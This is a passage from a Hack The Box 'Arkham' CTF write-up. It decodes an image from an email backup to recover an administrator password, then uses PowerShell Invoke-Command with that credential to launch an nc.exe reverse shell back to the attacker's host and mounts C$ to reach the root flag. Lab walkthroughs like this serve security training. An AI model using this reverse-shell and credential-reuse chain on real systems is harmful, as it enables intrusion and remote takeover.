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
+AQIE5hP4/wjr8uh7Wbf/AAAAAElFTkSuQmCC
+
+
+----boundary-LibPST-iamunique-672158152_-_---
+</code></pre></div></div>
+<p><br /> We can see two interesting things here, first one is this message : <code class="highlighter-rouge">Master Wayne stop forgetting your password</code> and second one is the base-64 encoded image. I decoded it and saved it :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/arkham/backups# nano image001.png.b64
+root@kali:~/Desktop/HTB/boxes/arkham/backups# base64 -d image001.png.b64 &gt; image001.png
+root@kali:~/Desktop/HTB/boxes/arkham/backups# file image001.png
+image001.png: PNG image data, 677 x 343, 8-bit/color RGB, non-interlaced
+root@kali:~/Desktop/HTB/boxes/arkham/backups# 
+</code></pre></div></div>
+<p><br /> <code class="highlighter-rouge">image001.png</code> :
+<img src="/images/hackthebox/arkham/13.png" alt="" />
+<br /> Great, we have the password for <code class="highlighter-rouge">Batman</code>. By checking the local group memberships of <code class="highlighter-rouge">Batman</code> we can see that <code class="highlighter-rouge">Batman</code> is in the Administrators group, and also in the Remote management users group :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\&gt;net user batman
+net user batman
+User name                    Batman
+Full Name
+Comment
+User's comment
+Country/region code          001 (United States)
+Account active               Yes
+Account expires              Never
+
+Password last set            2/3/2019 9:25:51 AM
+Password expires             Never
+Password changeable          2/3/2019 9:25:51 AM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   8/10/2019 1:29:47 AM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Administrators       *Remote Management Use
+                             *Users
+Global Group memberships     *None
+The command completed successfully.
+
+
+C:\&gt;
+</code></pre></div></div>
+<p><br /> So we can use <code class="highlighter-rouge">powershell</code>’s <code class="highlighter-rouge">Invoke-Command</code> with the credentials we have to get a reverse shell  :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\&gt;powershell
+powershell
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\&gt; $username = 'batman'
+$username = 'batman'
+PS C:\&gt; $password = 'Zx^#QZX+T!123'
+$password = 'Zx^#QZX+T!123'
+PS C:\&gt; $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
+$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
+PS C:\&gt; $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
+$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
+PS C:\&gt; Invoke-command -computername ARKHAM -credential $credential -scriptblock { cmd.exe /c "C:\windows\system32\spool\drivers\color\nc.exe" -e cmd.exe 10.10.xx.xx 1338 }                                      
+Invoke-command -computername ARKHAM -credential $credential -scriptblock { cmd.exe /c "C:\windows\system32\spool\drivers\color\nc.exe" -e cmd.exe 10.10.xx.xx 1338 }
+</code></pre></div></div>
+<p><img src="/images/hackthebox/arkham/14.png" alt="" />
+<br /></p>
+<hr />
+
+<h2 id="root-flag">Root Flag</h2>
+<p><br /> <code class="highlighter-rouge">Batman</code> is in the Administrators group, however I couldn’t read the flag :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\Batman\Documents&gt;cd ../../Administrator/Desktop
+cd ../../Administrator/Desktop
+Access is denied.
+
+C:\Users\Batman\Documents&gt;type C:\Users\Administrator\Desktop\root.txt 
+type C:\Users\Administrator\Desktop\root.txt
+Access is denied.
+
+C:\Users\Batman\Documents&gt;
+</code></pre></div></div>
+<p><br /> That was weird, after trying a lot of things I wanted to see If anything will change if I mounted <code class="highlighter-rouge">C$</code> then accessed it.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\&gt;net use Z: \\ARKHAM\C$
+net use Z: \\ARKHAM\C$
+The command completed successfully.
+</code></pre></div></div>
+<p><br /> And yes that worked :
+<img src="/images/hackthebox/arkham/15.png" alt="" />
+<br /> We owned root !
+<br /> That’s it , Feedback is appreciated !
+<br /> Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham">@Ahm3d_H3sham</a>
+<br /> Thanks for reading.
+<br />
+<br />
+<br /> Previous Hack The Box write-up : <a href="/hack-the-box/fortune/">Hack The Box - Fortune</a>
+<br /> Next Hack The Box write-up : <a href="/hack-the-box/helpline/">Hack The Box - Helpline</a></p>
+<hr />
+
+
+</div>
+
+
+
+
+
+<div class="related">
+  <h2>other posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/hack-the-box/onetwoseven/">
+            Hack The Box - OneTwoSeven
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/pwn/collision/">
+            pwnable.kr - collision
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/hack-the-box/unattended/">
+            Hack The Box - Unattended
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+
+
+
+  
+  <h2>All Tags</h2>
+  <div class="tag-cloud"><a href="/tag/active-directory/" class="set-1">active-directory</a> <a href="/tag/binary-exploitation/" class="set-3">binary-exploitation</a> <a href="/tag/bsd/" class="set-1">bsd</a> <a href="/tag/buffer-overflow/" class="set-2">buffer-overflow</a> <a href="/tag/c/" class="set-2">c</a> <a href="/tag/code-analysis/" class="set-1">code-analysis</a> <a href="/tag/cryptography/" class="set-1">cryptography</a> <a href="/tag/drupal/" class="set-1">drupal</a> <a href="/tag/egghunting/" class="set-1">egghunting</a> <a href="/tag/exploit-development/" class="set-1">exploit development</a> <a href="/tag/exploit-development/" class="set-2">exploit-development</a> <a href="/tag/firewall/" class="set-1">firewall</a> <a href="/tag/forensics/" class="set-1">forensics</a> <a href="/tag/ftp/" class="set-1">ftp</a> <a href="/tag/joomla/" class="set-1">joomla</a> <a href="/tag/latex-injection/" class="set-1">latex-injection</a> <a href="/tag/ldap/" class="set-1">ldap</a> <a href="/tag/lfi/" class="set-1">lfi</a> <a href="/tag/linux/" class="set-5">linux</a> <a href="/tag/networking/" class="set-2">networking</a> <a href="/tag/php/" class="set-2">php</a> <a href="/tag/pivoting/" class="set-1">pivoting</a> <a href="/tag/python/" class="set-3">python</a> <a href="/tag/rbash/" class="set-1">rbash</a> <a href="/tag/rce/" class="set-5">rce</a> <a href="/tag/reverse-engineering/" class="set-1">reverse-engineering</a> <a href="/tag/smb/" class="set-2">smb</a> <a href="/tag/snmp/" class="set-1">snmp</a> <a href="/tag/sqli/" class="set-1">sqli</a> <a href="/tag/ssh/" class="set-3">ssh</a> <a href="/tag/ssti/" class="set-1">ssti</a> <a href="/tag/steganography/" class="set-1">steganography</a> <a href="/tag/web/" class="set-5">web</a> <a href="/tag/windows/" class="set-3">windows</a> <a href="/tag/windows-exploitation/" class="set-1">windows-exploitation</a> <a href="/tag/wordpress/" class="set-1">wordpress</a></div>
+  
+
+
+
+      </div>
+    </main><footer class="site-footer">
+	<center> <script src="https://www.hackthebox.eu/badge/65598"></script> </center>
+  <div class="wrapper"><div class="toggleWrapper">
+    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
+    <label for="theme-toggle" class="toggle">
+    <span class="toggle__handler">
+      <span class="crater crater--1"></span>
+      <span class="crater crater--2"></span>
+      <span class="crater crater--3"></span>
+    </span>
+        <span class="star star--1"></span>
+        <span class="star star--2"></span>
+        <span class="star star--3"></span>
+        <span class="star star--4"></span>
+        <span class="star star--5"></span>
+        <span class="star star--6"></span>
+    </label>
+</div>
+<script type="text/javascript">
+const theme = localStorage.getItem('theme');
+if (theme === "dark") {
+	document.documentElement.setAttribute('data-theme', 'dark');
+}
+const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');
+
+if (theme === "dark") {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'dark');
+    document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	document.getElementById("theme-toggle").className = 'light';
+} else if (theme === "light") {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'light');
+    document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	document.getElementById("theme-toggle").className = 'dark';
+} else if  (userPrefers === "dark") {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'dark');
+	document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	window.localStorage.setItem('theme', 'dark');
+	document.getElementById("theme-toggle").className = 'light';
+} else {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'light');
+	document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	window.localStorage.setItem('theme', 'light');
+	document.getElementById("theme-toggle").className = 'dark';
+}
+
+function modeSwitcher() {
+	let currentMode = document.documentElement.getAttribute('data-theme');
+	if (currentMode === "dark") {
+	    document.documentElement.setAttribute('data-theme', 'light');
+		document.documentElement.classList.add('theme--light');
+        document.documentElement.classList.remove('theme--dark');
+		window.localStorage.setItem('theme', 'light');
+	    document.getElementById("theme-toggle").className = 'dark';
+	} else {
+	    document.documentElement.setAttribute('data-theme', 'dark');
+		document.documentElement.classList.add('theme--dark');
+        document.documentElement.classList.remove('theme--light');
+		window.localStorage.setItem('theme', 'dark');
+	    document.getElementById("theme-toggle").className = 'light';
+	}
+}
+</script></div>
+  </div>
+</footer>
+
+
+<script>
+      window.FontAwesomeConfig = {
+        searchPseudoElements: true
+      }
+    </script>
+  </body>
+
+</html>
